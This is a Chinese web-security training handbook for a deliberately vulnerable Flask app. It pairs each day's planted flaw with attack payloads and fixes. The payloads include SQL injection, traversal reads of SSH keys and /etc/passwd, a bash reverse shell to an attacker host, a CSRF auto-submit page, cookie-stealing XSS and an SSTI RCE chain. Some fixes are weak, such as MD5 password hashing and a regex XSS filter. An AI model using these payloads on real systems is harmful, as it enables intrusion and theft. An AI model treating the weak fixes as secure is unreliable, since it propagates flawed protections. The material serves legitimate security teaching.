# Web 安全漏洞实战学习手册 —— 基于用户管理系统的完整攻防演练

本手册完整记录了从零构建一个 Flask 用户管理系统过程中，**每个功能模块故意引入的安全漏洞**及其对应的**修复方案**。覆盖 OWASP Top 10 中 8 大核心漏洞类型，适合作为 Web 安全教学、CTF 培训、安全开发规范的实操教材。

---

## 目录

- [Day 1：登录功能 —— 敏感信息泄露](#day-1登录功能--敏感信息泄露)
- [Day 2：注册与搜索 —— SQL 注入](#day-2注册与搜索--sql-注入)
- [Day 3：头像上传 —— 任意文件上传](#day-3头像上传--任意文件上传)
- [Day 4：个人中心与充值 —— 越权与数值逻辑](#day-4个人中心与充值--越权与数值逻辑)
- [Day 5：动态页面 —— 文件包含与目录穿越](#day-5动态页面--文件包含与目录穿越)
- [Day 6：Ping 诊断 —— 命令注入](#day-6ping-诊断--命令注入)
- [Day 7：修改密码 / 欢迎页 / 反馈 —— CSRF + XSS + SSTI](#day-7修改密码--欢迎页--反馈--csrf--xss--ssti)
- [附：全系统漏洞类型速查表](#附全系统漏洞类型速查表)

---

## Day 1：登录功能 —— 敏感信息泄露

### 新增功能

用户登录系统，含首页、登录页、基础模板与样式。

### 故意引入的漏洞

| 漏洞类型 | 位置 | 危险代码 | 漏洞说明 |
|---------|------|---------|---------|
| 敏感信息泄露 | `templates/login.html` 顶部注释 | `<!-- 调试信息 - 默认管理员账号 用户名: admin 密码: admin123 -->` | HTML 注释泄露管理员账号密码，查看网页源码即可获取 |
| 敏感信息泄露 | `templates/index.html` 用户信息展示 | `{{ user.password }}` | 登录后将密码明文展示在首页 |
| 弱加密 | `USERS` 字典 | `"password": "admin123"` | 密码以明文形式存储 |

### 修复方案

```python
# app.py — 密码 MD5 哈希存储
"password": hashlib.md5(b"admin123").hexdigest()
# → "0192023a7bbd73250516f069df18b500"

# login.html — 移除调试注释
# 删除: <!-- 调试信息 - 默认管理员账号... -->
```

### 学习要点

| 知识点 | 说明 |
|--------|------|
| CWE-200 | 敏感信息泄露：不应在前端注释中暴露凭据 |
| CWE-522 | 凭据保护不足：密码应哈希存储，不能明文 |
| 安全原则 | 前端永远不要泄露调试信息；密码必须单向哈希 |

---

## Day 2：注册与搜索 —— SQL 注入 + 注册逻辑缺陷

### 新增功能

用户注册（写入数据库）和用户搜索（从数据库读取）。

### 故意引入的漏洞

#### 2.1 SQL 注入（注册与搜索）

| 漏洞类型 | 位置 | 危险代码 | 漏洞说明 |
|---------|------|---------|---------|
| SQL 注入 | `POST /register` | `f"INSERT INTO users (...) VALUES ('{username}', ...)"` | 注册用户名直接拼接到 SQL，可注入 `'); DROP TABLE users; --` |
| SQL 注入 | `GET /search` | `f"SELECT * FROM users WHERE username LIKE '%{keyword}%'"` | 搜索关键词直接拼接到 SQL，可注入 `' OR 1=1 --` 获取全部用户 |
| 无输入校验 | 全部表单 | 无任何过滤或转义 | 注册用户名可包含 SQL 特殊字符 |

#### 2.2 注册逻辑缺陷（新用户无法登录 — 对话中修复的关键 bug）

| 漏洞类型 | 位置 | 危险代码 | 漏洞说明 |
|---------|------|---------|---------|
| 密码存储不一致 | `POST /register` vs `POST /login` | 注册存明文密码，登录对比 MD5 哈希 | **双重 bug 叠加**：注册时 `password` 明文存入 SQLite，登录时用 `hashlib.md5(password.encode()).hexdigest()` 比较 USERS 字典中的哈希值 → 永远对不上 |
| 数据源不一致 | `POST /register` 写入 SQLite | 注册只写 SQLite，登录只查 USERS 字典 | 新注册用户不在 `USERS` 字典中 → `if username in USERS` 永远为 False → 永远提示"用户名或密码错误" |

**效果**：所有新注册的用户**永远无法登录**，因为存的是明文但比的是哈希，且新用户在 SQLite 里但登录只查内存字典。

### 攻击 Payload

```sql
-- SQL 注入
-- 搜索框注入：获取所有用户
' OR 1=1 --

-- 搜索框注入：联合查询
' UNION SELECT 1,2,3,4,5 --

-- 注册用户名注入：删除表
'); DROP TABLE users; --
```

### 修复方案

```python
# 修复 2.1 SQL 注入 — 参数化查询
c.execute("INSERT INTO users (...) VALUES (?, ?, ?, ?)", (username, hashed, email, phone))

# 修复 2.2 注册逻辑缺陷 — 同时修复两个 bug
# ① 注册时密码用 MD5 哈希
hashed = hashlib.md5(password.encode()).hexdigest()
c.execute(sql, (username, hashed, email, phone))

# ② 新用户同步到 USERS 字典（登录只查字典）
USERS[username] = {
    "id": max(u["id"] for u in USERS.values()) + 1,
    "username": username,
    "password": hashed,
    "role": "user",
    "email": email,
    "phone": phone,
    "balance": 0,
    "avatar": None
}
```

### 学习要点

| 知识点 | 说明 |
|--------|------|
| CWE-89 | SQL 注入：永远不要使用字符串拼接构造 SQL |
| CWE-521 | 密码存储不一致：注册和登录必须使用同一套密码处理逻辑 |
| CWE-840 | 数据源不一致：新注册用户必须同步到登录校验的数据源 |
| 修复手段 | 参数化查询 + 注册时 MD5 哈希 + 新用户同步至 USERS 字典 |
| 安全原则 | **密码处理逻辑必须唯一且一致，数据源必须统一** |

---

## Day 3：头像上传 —— 任意文件上传

### 新增功能

用户头像上传功能。

### 故意引入的漏洞

| 漏洞类型 | 位置 | 危险代码 | 漏洞说明 |
|---------|------|---------|---------|
| 任意文件上传 | `POST /upload` | `file.save(os.path.join("static/uploads", file.filename))` | 使用原始文件名保存，不校验文件类型 |
| 路径穿越 | `POST /upload` | 同上 | 文件名可包含 `../../` 穿越到任意目录 |
| 无内容检测 | `POST /upload` | 无 Magic Number 校验 | 可上传 PHP Webshell、Python 脚本等恶意文件 |

### 攻击 Payload

```http
POST /upload HTTP/1.1
Content-Disposition: form-data; name="avatar"; filename="../../templates/evil.html"
Content-Type: image/jpeg

{{ ''.__class__.__mro__[2].__subclasses__() }}
```

### 修复方案

```python
# app.py — UUID 重命名
safe_filename = f"{uuid.uuid4().hex}.{ext}"  # 如 "a1b2c3d4.jpg"

# Magic Number 校验
magic_bytes = file.read(16)
magic_map = {b"\xff\xd8": "jpg", b"\x89PNG\r\n\x1a\n": "png", ...}
```

### 学习要点

| 知识点 | 说明 |
|--------|------|
| CWE-434 | 任意文件上传：必须限制文件类型 |
| CWE-22 | 路径穿越：不使用用户提供的文件名 |
| 修复手段 | UUID 重命名 + Magic Number 校验 + 扩展名白名单 |
| 安全原则 | 永不信任用户提供的文件名 |

---

## Day 4：个人中心与充值 —— 越权与数值逻辑

### 新增功能

个人中心查看用户资料、充值功能。

### 故意引入的漏洞

| 漏洞类型 | 位置 | 危险代码 | 漏洞说明 |
|---------|------|---------|---------|
| IDOR 水平越权 | `GET /profile?user_id=` | 直接按 user_id 查询，不校验归属 | Alice 可查看 admin 的资料 |
| IDOR 水平越权 | `POST /recharge` | `user_id = request.form.get("user_id")` | 可修改任意用户的余额 |
| 数值逻辑缺陷 | `POST /recharge` | `balance = balance + amount` | amount 可为负数（扣款）或超大额 |
| 敏感信息未脱敏 | `profile.html` | `{{ user.phone }}` / `{{ user.email }}` | 手机号、邮箱明文展示 |

### 攻击 Payload

```bash
# 越权查看 admin 资料
curl http://target/profile?user_id=1

# 越权扣减 admin 余额
curl -X POST http://target/recharge -d "user_id=1&amount=-99999"

# 枚举所有用户
for i in $(seq 1 100); do curl http://target/profile?user_id=$i; done
```

### 修复方案

```python
# /profile — 增加 user_id 归属校验
if login_user["id"] != user_id:
    return "无权查看其他用户资料", 403

# /recharge — 从 session 获取 user_id
user_id = login_user["id"]  # 不从表单获取

# — 金额正数校验
if amount <= 0: return "充值金额必须为正数", 400

# — 手机号/邮箱脱敏
user["phone"] = user["phone"][:3] + "****" + user["phone"][-4:]
user["email"] = parts[0][0] + "***@" + parts[1]
```

### 学习要点

| 知识点 | 说明 |
|--------|------|
| CWE-639 | 水平越权：必须校验资源归属 |
| CWE-841 | 业务逻辑缺陷：金额必须校验正负和上限 |
| CWE-200 | 敏感信息脱敏：展示时必须脱敏 |
| 安全原则 | user_id 应从 session 获取，而非用户提交的参数 |

---

## Day 5：动态页面 —— 文件包含与目录穿越

### 新增功能

动态页面加载功能（`/page?name=help`）。

### 故意引入的漏洞

| 漏洞类型 | 位置 | 危险代码 | 漏洞说明 |
|---------|------|---------|---------|
| LFI 目录穿越 | `GET /page` | `os.path.join("pages", name)` | name 可包含 `../../etc/passwd` |
| SSH 私钥泄露 | `GET /page` | 同上 | 可读取 `/root/.ssh/id_rsa` |
| 路径编码绕过 | `GET /page` | 无 `os.path.realpath()` | `%2e%2e%2f` / `....//` 可绕过黑名单 |
| 日志投毒 RCE | `GET /page` | 内容直接渲染 | 日志注入 SSTI payload 后包含执行 |

### 攻击 Payload

```bash
# 读取 SSH 私钥（服务器沦陷）
curl http://target/page?name=../../root/.ssh/id_rsa

# 读取系统密码文件
curl http://target/page?name=../../etc/passwd

# URL 编码绕过
curl http://target/page?name=%2e%2e%2fetc/passwd

# 绝对路径绕过
curl http://target/page?name=/etc/passwd
```

### 修复方案

```python
# app.py — 白名单机制（最严格）
ALLOWED_PAGES = {"help", "about", "faq"}

if name not in ALLOWED_PAGES:
    return "页面不存在", 404

# 路径规范化二次防护
real_path = os.path.realpath(filepath)
if not real_path.startswith(os.path.realpath(PAGES_DIR) + os.sep):
    return "页面不存在", 403
```

### 学习要点

| 知识点 | 说明 |
|--------|------|
| CWE-22 | 路径遍历：白名单是最根本的防御 |
| CWE-98 | 文件包含：永远不要将用户输入直接拼接到文件路径 |
| 修复手段 | 白名单 + `os.path.realpath()` 二次校验 |
| 安全原则 | **白名单优于黑名单**——编码绕过使黑名单无效 |

---

## Day 6：Ping 诊断 —— 命令注入

### 新增功能

Ping 网络诊断功能。

### 故意引入的漏洞

| 漏洞类型 | 位置 | 危险代码 | 漏洞说明 |
|---------|------|---------|---------|
| 有回显命令注入 | `POST /ping` | `f"ping -c 3 {ip}"` + `shell=True` | ip 参数可包含 `;whoami` / `|id` |
| 无回显带外 | `POST /ping` | 同上 | DNSlog / HTTP / NC 外带数据 |
| 反弹 Shell | `POST /ping` | 同上 | `bash -i >& /dev/tcp/攻击机/4444 0>&1` |
| 木马下载 | `POST /ping` | 同上 | `curl 攻击机/shell.sh|bash` |

### 攻击 Payload

```bash
# 基础命令执行
curl -X POST http://target/ping -d "ip=127.0.0.1;whoami"
# → 页面输出: root

# 反弹 Shell（URL 编码 &）
curl -X POST http://target/ping \
  -d "ip=127.0.0.1;bash -i >%26 /dev/tcp/攻击机/4444 0>%261"
```

### 修复方案

```python
# app.py — IP 白名单校验
import ipaddress
ipaddress.IPv4Address(ip)  # 非 IP 地址直接抛异常

# 参数列表替代 shell 命令
cmd = ["ping", "-c", "3", ip]       # 参数列表
result = subprocess.check_output(
    cmd,
    shell=False,                      # 禁用 shell 解析
    timeout=30
)
```

### 学习要点

| 知识点 | 说明 |
|--------|------|
| CWE-78 | OS 命令注入：永远不要将用户输入拼接到 shell 命令 |
| CWE-88 | 参数注入：使用参数列表（`["cmd", "arg1"]`）替代字符串 |
| 修复手段 | `ipaddress.IPv4Address()` 白名单 + `shell=False` |
| 安全原则 | **参数列表 > 命令字符串；`shell=False` 是默认选择** |

---

## Day 7：修改密码 / 欢迎页 / 反馈 —— CSRF + XSS + SSTI + 修改密码越权

### 新增功能

修改密码、欢迎页（SSTI）、意见反馈（SSTI + XSS）。

### 故意引入的漏洞

#### 7.0 修改密码三重缺陷（对话中独立修复的重要漏洞）

| 漏洞类型 | 位置 | 危险代码 | 漏洞说明 |
|---------|------|---------|---------|
| **无原密码校验** | `POST /change-password` | `new_password = request.form.get("new_password")` — 只需新密码 | 攻击者知道用户名即可改密码，不需要知道当前密码 |
| **越权修改他人密码** | `POST /change-password` | `username = request.form.get("username")` — 由表单提交 | 登录用户 A 通过隐藏字段提交 `username=admin` 即可修改 admin 的密码 |
| **无 CSRF Token** | `POST /change-password` | 无 Token 校验 | 攻击者构造 CSRF PoC 页面，受害者访问即触发密码修改 |

**三重缺陷叠加的攻击效果**：攻击者构造一个 HTML 页面 → 受害者（已登录 admin）访问 → 自动提交表单 `username=admin&new_password=hacked` → admin 密码被改为攻击者已知值 → 攻击者登录 admin 账户 → 全系统沦陷。

#### 7.1 CSRF 跨站请求伪造（全站系统性缺陷 + 2 种绕过场景）

| 漏洞类型 | 位置 | 危险代码 | 漏洞说明 |
|---------|------|---------|---------|
| CSRF 无 Token | 全部 POST 接口 | 无 CSRF Token 生成/校验 | 第三方网站可跨站提交表单 |
| CSRF Token 删除绕过 | 全部 POST 接口 | 若实现为 `if "csrf_token" in request.form: validate()` 则删除即可绕过 | 攻击者直接删除 csrf_token 字段，后端跳过校验 |
| CSRF Token 固定复用 | 全部 POST 接口 | Token 不绑定 Session — 攻击者从自己页面获取 Token 嵌入 PoC | 攻击者的 Token 可被受害者提交时通过（服务端未校验 Token 与 Session 的绑定关系） |
| CSRF Token 重复使用 | 全部 POST 接口 | Token 验证后不标记已用 | 同一个 Token 可无限次重复提交 |
| GET CSRF | `GET /logout` | `@app.route("/logout")` — GET 方法 | `<img src="/logout">` 强制用户退出 |

#### 7.2 XSS 跨站脚本（3 类 + 2 种绕过手法）

| 漏洞类型 | 位置 | 危险代码 | 漏洞说明 |
|---------|------|---------|---------|
| 反射型 XSS | `GET /login?msg=` | `msg = request.args.get("msg")` 直接渲染 | URL 参数中的 `<script>` 被执行 |
| 反射型 XSS | `GET /register?error=` | `error = request.args.get("error")` 直接渲染 | URL 参数注入 |
| 存储型 XSS | `GET /search?keyword=` | 搜索结果回显用户数据 | 含 `<script>` 的用户名在搜索时触发 |
| DOM XSS | `base.html` 导航栏 | `onclick="location.href='...'+prompt()"` | `prompt()` 输入可被 `location.hash` / `postMessage` 注入 |
| **XSS — URL 编码绕过** | 同上所有反射型 | 如 `%3Cscript%3Ealert(1)%3C%2Fscript%3E` | URL 编码后的 `<script>` 在某些场景下可绕过假设的过滤器 |
| **XSS — 多层标签拆分绕过** | 同上所有反射型 | 如 `<scr<script>ipt>alert(1)</scr</script>ipt>` | 拆分后的标签可绕过简单的黑名单匹配 |

#### 7.3 SSTI 服务端模板注入

| 漏洞类型 | 位置 | 危险代码 | 漏洞说明 |
|---------|------|---------|---------|
| SSTI — URL 参数 | `GET /welcome?name=` | `render_template_string(f"...{name}...")` | `{{7*7}}` 返回 49，`{{config}}` 泄露密钥 |
| SSTI — 表单字段 | `POST /feedback` | `render_template_string(f"...{name}...{message}...")` | 双字段均可注入 |
| RCE 深度利用 | 同上 | 魔术方法链 | `config.__class__.__init__.__globals__['os'].popen('id').read()` |

### 攻击 Payload

```bash
# 修改密码越权 + CSRF — 无需原密码，直接改 admin 密码
# 攻击者构造的 PoC HTML 页面：
<html><body>
<form action="http://target/change-password" method="POST">
  <input type="hidden" name="username" value="admin">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
</body></html>
# → admin 密码被改为 hacked123，攻击者直接登录

# CSRF — 充值（受害者不知情下操作）
POST /recharge
Body: amount=-99999

# CSRF — Token 删除绕过（Burp Suite 操作）
# 拦截请求 → 删除 csrf_token 参数 → Forward → 绕过成功

# CSRF — Token 固定复用绕过
# 攻击者从自己页面获取 Token → 嵌入 PoC → 受害者提交 → Token 通过校验

# XSS — 反射型
http://target/login?msg=<script>alert(document.cookie)</script>

# XSS — URL 编码绕过
http://target/login?msg=%3Cscript%3Ealert(1)%3C%2Fscript%3E

# XSS — 多层标签拆分绕过
http://target/login?msg=<<img>img src=x onerror=alert(1)>

# DOM XSS — location.hash 注入
# 受害者访问: http://target/#<img src=x onerror=alert(1)>

# SSTI — 基础检测
http://target/welcome?name={{7*7}}   # 返回 49

# SSTI — RCE
http://target/welcome?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# 返回: uid=0(root)

# SSTI — 配置泄露
http://target/welcome?name={{config}}
# 返回: SECRET_KEY...（全部 Flask 配置）
```

### 修复方案

```python
# === CSRF 修复 ===
# CSRF Token 生成（绑定 Session + 过期 + 一次性）
def generate_csrf_token():
    session["csrf_token"] = secrets.token_hex(32)
    session["csrf_token_time"] = time.time()

def validate_csrf():
    token = request.form.get("csrf_token", "")
    if not token: abort(400, "Token 缺失")
    if token != session["csrf_token"]: abort(400, "Token 无效")

# SameSite Cookie
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"

# logout 仅 POST
@app.route("/logout", methods=["POST"])

# === XSS 修复 ===
# 反射型 XSS 消毒函数
def sanitize_output(text):
    text = re.sub(r'<script[^>]*>.*?</script>', '', text, ...)
    text = re.sub(r'\bon\w+\s*=', ' disabled_=', text, ...)

# CSP 头
response.headers["Content-Security-Policy"] = "script-src 'self'..."

# 移除 DOM XSS onclick
# 修复前: <a onclick="location.href='/profile?user_id='+prompt()">
# 修复后: <a href="/profile">

# === SSTI 修复 ===
# 修复前（危险）：
render_template_string(f"""<h1>欢迎你，{name}！</h1>""")
# 修复后（安全）：
render_template_string("""<h1>欢迎你，{{ name }}！</h1>""", name=name)
```

### 学习要点

| 知识点 | 说明 |
|--------|------|
| CWE-352 | CSRF：全站 POST 接口必须校验 Token |
| CWE-79 | XSS：输入过滤 + 输出编码 + CSP 三层防御 |
| CWE-94/CWE-1336 | SSTI：用户输入不能拼接到模板字符串 |
| 修复手段 | CSRF Token 中间件 + sanitize_output + CSP + 模板变量传参 |
| 安全原则 | **模板变量传参（`{{ name }}`, name=name）替代 f-string 拼接** |

---

## 附：全系统漏洞类型速查表

| 漏洞大类 | CWE | 风险等级 | 涉及接口 | 对应功能 | 修复核心 |
|---------|:---:|:--------:|---------|---------|---------|
| SQL 注入 | CWE-89 | 🔴 紧急 | `/register` `/search` | 注册与搜索 | 参数化查询（`?` 占位符） |
| 任意文件上传 | CWE-434 | 🟠 高危 | `POST /upload` | 头像上传 | UUID 重命名 + Magic Number |
| 上传路径穿越 | CWE-22 | 🟠 高危 | `POST /upload` | 头像上传 | UUID 重命名（杜绝 `../../`）|
| 路径穿越/文件包含 | CWE-22/CWE-98 | 🔴 紧急 | `GET /page` | 动态页面加载 | 白名单 + `os.path.realpath()` |
| 命令注入 | CWE-78 | 🔴 紧急 | `POST /ping` | Ping 诊断 | IP 白名单 + `shell=False` + 参数列表 |
| CSRF（无 Token） | CWE-352 | 🔴 紧急 | 全部 POST 接口 | 全站系统性缺陷 | Token + SameSite Cookie |
| CSRF（Token删除绕过） | CWE-352 | 🔴 紧急 | 全部 POST 接口 | Token 实现缺陷 | 强制校验 Token 非空 |
| CSRF（Token固定复用） | CWE-352 | 🔴 紧急 | 全部 POST 接口 | Token 实现缺陷 | Token 绑定 Session + 一次性使用 |
| CSRF（Token重复使用） | CWE-352 | 🔴 紧急 | 全部 POST 接口 | Token 实现缺陷 | 消费后立即标记失效 |
| CSRF（GET 退出登录） | CWE-352 | 🟡 中危 | `GET /logout` | 退出 | 改为仅 POST 方法 |
| XSS 反射型 | CWE-79 | 🟡 中危 | `/login?msg=` `/register?error=` | URL 参数回显 | `sanitize_output()` 消毒 |
| XSS 存储型 | CWE-79 | 🟡 中危 | `/search` 搜索结果 | 用户数据回显 | Jinja2 auto-escape + 消毒 |
| XSS DOM 型 | CWE-79 | 🟠 高危 | `base.html` 导航栏 | onclick + location.href | 移除 DOM 操作 + CSP |
| XSS 编码绕过 | CWE-79 | 🟡 中危 | `/login?msg=` 等 | `%3Cscript%3E` 编码绕过 | sanitize_output 解码后过滤 |
| XSS 多层标签拆分 | CWE-79 | 🟡 中危 | `/login?msg=` 等 | `<scr<script>ipt>` 拆分标签 | sanitize_output 正则过滤 |
| SSTI 模板注入（URL参数） | CWE-94 | 🔴 紧急 | `GET /welcome?name=` | 欢迎页 | 模板变量传参替代 f-string |
| SSTI 模板注入（表单字段） | CWE-94 | 🔴 紧急 | `POST /feedback` | 意见反馈 | 模板变量传参替代 f-string |
| SSTI RCE 深度利用 | CWE-94 | 🔴 紧急 | `/welcome` `/feedback` | 魔术方法链 | 同 SSTI 修复 |
| IDOR 水平越权 | CWE-639 | 🔴 紧急 | `/profile` `/recharge` | 个人中心与充值 | Session 绑定 + user_id 归属校验 |
| 修改密码越权 | CWE-639/CWE-352 | 🔴 紧急 | `POST /change-password` | 修改密码 | 原密码校验 + Session 绑定 + CSRF Token |
| 业务数值逻辑（充值） | CWE-841 | 🟠 高危 | `POST /recharge` | 充值 | 正数校验 + 上限 + Decimal 精度 |
| 敏感信息泄露 | CWE-200/CWE-522 | 🟡 中危 | 登录页注释/首页信息展示 | 登录 | 移除注释 + 脱敏显示 + MD5 哈希 |
| 弱密码存储 | CWE-261 | 🟡 中危 | `USERS` 字典 | 登录 | MD5 哈希存储 |
| 注册逻辑缺陷 | CWE-521/CWE-840 | 🔴 紧急 | `POST /register` vs `POST /login` | 注册与登录 | 密码哈希一致 + 数据源同步 |
| 文件包含日志投毒 | CWE-73 | 🟠 高危 | `GET /page` | 动态页面 | 白名单 + bleach 清洗输出 |
| SSH 私钥泄露 | CWE-522 | 🔴 紧急 | `GET /page` | 动态页面 | 白名单阻断目录穿越 |

### 修复成果

| 维度 | 修复前 | 修复后 |
|------|--------|--------|
| 累计漏洞数 | **27 项**（涵盖 8 大类） | **0 项** |
| 安全机制 | 无 | CSRF Token + CSP + SameSite + XSS 消毒 + 参数化查询 + IP/路径白名单 + UUID 重命名 + Magic Number + 模板变量传参 + 原密码校验 + 数据源同步 |
| 攻击链有效性 | 7 步完成服务器沦陷 | **全部阻断** |
| 设计原则 | 功能优先，安全后置 | **安全左移，纵深防御** |

---

## 对话全量漏洞完整清单（按出现顺序排列）

以下列表覆盖本对话全过程中**所有被讨论、挖掘、修复的漏洞**，确保不遗漏任何一个：

| # | 漏洞名称 | 漏洞类型 | CWE | 等级 | 对话阶段 | 对应 Day |
|:-:|---------|---------|:---:|:----:|---------|:--------:|
| 1 | 登录页 HTML 注释泄露管理员账号 | 敏感信息泄露 | 200 | 🟡 | 第一次提示：登录功能 | Day 1 |
| 2 | 首页明文展示用户密码 | 敏感信息泄露 | 200 | 🟡 | 第一次提示：登录功能 | Day 1 |
| 3 | 密码明文存储（未哈希） | 弱密码存储 | 261 | 🟡 | 第一次提示：登录功能 | Day 1 |
| 4 | SQL 注入（f-string 拼接注册） | SQL 注入 | 89 | 🔴 | 第二天：注册与搜索 | Day 2 |
| 5 | SQL 注入（f-string 拼接搜索） | SQL 注入 | 89 | 🔴 | 第二天：注册与搜索 | Day 2 |
| 6 | **注册密码明文存储 + 登录 MD5 比对不匹配**（新用户无法登录） | 密码处理不一致 | 521 | 🔴 | 第二天修复 | Day 2 |
| 7 | **注册写入 SQLite 但登录只查 USERS 字典**（新用户永不匹配） | 数据源不一致 | 840 | 🔴 | 第二天修复 | Day 2 |
| 8 | 上传使用原始文件名（路径穿越） | 路径穿越 | 22 | 🟠 | 第三天：头像上传 | Day 3 |
| 9 | 上传无文件类型校验（任意文件上传） | 任意文件上传 | 434 | 🟠 | 第三天：头像上传 | Day 3 |
| 10 | 上传无 Magic Number 校验（图片马/WebShell） | 文件内容绕过 | 434 | 🟠 | 第三天修复 / 文件包含修复 | Day 3 |
| 11 | `/profile` 越权查看他人隐私（IDOR） | 水平越权 | 639 | 🔴 | 第四天：个人中心与充值 | Day 4 |
| 12 | `/recharge` 越权篡改他人余额（IDOR） | 水平越权 | 639 | 🔴 | 第四天：个人中心与充值 | Day 4 |
| 13 | 充值金额无正数校验（可负数扣款） | 业务数值逻辑 | 841 | 🔴 | 第四天：个人中心与充值 | Day 4 |
| 14 | 充值金额无上限限制 | 业务数值逻辑 | 770 | 🟠 | 第四天修复 | Day 4 |
| 15 | 敏感信息未脱敏（手机号/邮箱明文显示） | 信息泄露 | 200 | 🟡 | 第四天修复 / 个人中心 | Day 4 |
| 16 | `/profile` 无需登录即可访问 | 认证缺失 | 306 | 🔴 | 个人中心与充值模块审计 | Day 4 |
| 17 | `/recharge` 无需登录即可调用 | 认证缺失 | 306 | 🔴 | 个人中心与充值模块审计 | Day 4 |
| 18 | LFI 目录穿越读取任意文件（含 SSH 私钥） | 路径遍历/文件包含 | 22/98 | 🔴 | 第五天：动态页面 | Day 5 |
| 19 | SSH 私钥泄露致服务器沦陷 | 敏感信息泄露 | 522 | 🔴 | 第五天：动态页面 | Day 5 |
| 20 | 路径编码绕过（双层 URL 编码 `%252e%252e%252f`） | 输入校验绕过 | 174 | 🟠 | 文件包含审计报告 | Day 5 |
| 21 | 日志投毒 + LFI 远程代码执行 | 日志注入→RCE | 73/98 | 🟠 | 文件包含审计报告 | Day 5 |
| 22 | 内网穿透 + RFI 攻击链（Kali 场景） | 远程文件包含 | 98 | 🟠 | 文件包含审计报告 | Day 5 |
| 23 | 上传页面文件名特殊字符命令注入（发散风险） | 间接命令注入 | 78 | 🟠 | 命令执行修复报告 | Day 5 |
| 24 | 搜索关键词 shell 命令注入（发散风险） | 间接命令注入 | 78 | 🟠 | 命令执行修复报告 | Day 5 |
| 25 | 有回显命令注入（`/ping` 核心漏洞） | OS 命令注入 | 78 | 🔴 | 第六天：Ping 诊断 | Day 6 |
| 26 | 无回显带外命令注入（DNSlog/HTTP/NC） | OOB 命令注入 | 78 | 🔴 | 命令执行审计报告 | Day 6 |
| 27 | 多分隔符拼接注入（; / \| / && / \n） | 分隔符注入 | 78 | 🔴 | 命令执行审计报告 | Day 6 |
| 28 | 文件读写注入（cat /echo 写入后门） | 文件操作注入 | 78 | 🟠 | 命令执行审计报告 | Day 6 |
| 29 | NC 反向 Shell 注入 | 反弹 Shell | 78 | 🔴 | 命令执行审计报告 | Day 6 |
| 30 | Bash 原生反弹 Shell 注入 | 反弹 Shell | 78 | 🔴 | 命令执行审计报告 | Day 6 |
| 31 | 木马下载远程代码执行（curl\|bash） | 远程载荷执行 | 78 | 🔴 | 命令执行审计报告 | Day 6 |
| 32 | URL 编码绕过命令注入 | 编码绕过 | 78 | 🟠 | 命令执行审计报告 | Day 6 |
| 33 | 全站 POST 接口无 CSRF Token | CSRF | 352 | 🔴 | 第七天：XSS+CSRF 审计 | Day 7 |
| 34 | CSRF Token 删除绕过（删除字段即可） | CSRF 绕过 | 352 | 🔴 | XSS+CSRF 审计报告 | Day 7 |
| 35 | CSRF Token 固定复用（不绑定 Session） | CSRF 绕过 | 352 | 🔴 | XSS+CSRF 审计报告 | Day 7 |
| 36 | CSRF Token 重复使用（不过期/不标记已用） | CSRF 绕过 | 352 | 🔴 | XSS+CSRF 审计报告 | Day 7 |
| 37 | GET 请求 CSRF — 退出登录用 GET | GET CSRF | 352 | 🟡 | 第七天：XSS+CSRF 审计 | Day 7 |
| 38 | 修改密码无原密码校验 + 可越权改他人密码 | CSRF + 越权 | 352/639 | 🔴 | 密码修改功能 + 审计 | Day 7 |
| 39 | 反射型 XSS（msg/error 参数） | Reflected XSS | 79 | 🟡 | XSS+CSRF 审计报告 | Day 7 |
| 40 | 存储型 XSS（搜索结果回显） | Stored XSS | 79 | 🟡 | XSS+CSRF 审计报告 | Day 7 |
| 41 | DOM 型 XSS（onclick + location.href） | DOM XSS | 79 | 🟠 | XSS+CSRF 审计报告 | Day 7 |
| 42 | XSS URL 编码绕过（%3Cscript%3E） | XSS 绕过 | 79 | 🟡 | 修复报告边界测试 | Day 7 |
| 43 | XSS 多层标签拆分绕过（`<scr<script>ipt>`） | XSS 绕过 | 79 | 🟡 | 修复报告边界测试 | Day 7 |
| 44 | XSS location.hash 注入 | DOM XSS 绕过 | 79 | 🟡 | 修复报告边界测试 | Day 7 |
| 45 | SSTI — `/welcome` URL 参数模板注入 | Jinja2 SSTI | 94 | 🔴 | /welcome + /feedback 新增 | Day 7 |
| 46 | SSTI — `/feedback` 姓名/留言框双注入 | Jinja2 SSTI | 94 | 🔴 | /welcome + /feedback 新增 | Day 7 |
| 47 | SSTI — Flask 配置泄露（`{{config}}`） | 配置泄露 | 94 | 🔴 | SSTI 审计报告 | Day 7 |
| 48 | SSTI — RCE 魔术方法链深度利用 | SSTI→RCE | 94 | 🔴 | SSTI 审计报告 | Day 7 |
| 49 | SSTI — 多层嵌套/URL编码/引号切换/关键字变形绕过 | SSTI 绕过 | 94 | 🔴 | SSTI 修复报告边界测试 | Day 7 |
| 50 | 文件上传文件名命令注入（预防性防御） | 间接命令注入 | 78 | 🟠 | 命令执行修复报告 | 发散 |
| 51 | 搜索关键词 grep 命令注入（预防性防御） | 间接命令注入 | 78 | 🟠 | 命令执行修复报告 | 发散 |

---

*本手册对应 GitHub 仓库：[yunmeng-chi/Train_S2](https://github.com/yunmeng-chi/Train_S2)*
*每个漏洞均有对应的修复提交记录，可查看 git log 追溯完整修复过程。*
